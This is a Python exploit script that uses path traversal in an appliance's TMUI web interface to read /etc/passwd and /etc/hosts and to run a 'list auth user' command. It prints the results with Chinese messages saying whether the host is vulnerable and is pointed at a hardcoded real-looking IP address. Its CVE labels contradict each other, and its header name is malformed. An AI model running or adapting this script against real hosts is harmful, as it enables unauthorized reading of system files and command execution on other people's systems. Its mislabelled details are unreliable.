#coding:utf-8
import sys
import requests
#import random_str
import time
sys.path.insert(0,'../')
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exp_cve_2018_1335(url,portu=443):
    headers = {
        "X - Forwarded - For": "127.0.0.1"
    }
    target_url = url
    payload1 = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    payload2 = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts"
    payload3 = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user"
    try:
        response1 = requests.get(payload1,verify=False,headers=headers,timeout=10)
        response2 = requests.get(payload2,verify=False,headers=headers,timeout=10)
        response3 = requests.get(payload3,verify=False,headers=headers,timeout=10)
        r1 = json.loads(response1.text)
        result1 = r1["output"]
        r2 = json.loads(response2.text)
        result2 = r2["output"]
        r3 = json.loads(response3.text)
        result3 = r3["output"]
        print(result1)
        if result1 != None or result2 != None or result3 != None:
            print("存在cve-2020-5092漏洞")
        else:
            print("疑是存在cve-2020-5092漏洞")
    except:
        print("不存在cve-2020-5092漏洞")

url = "https://189.125.193.118"
exp_cve_2018_1335(url)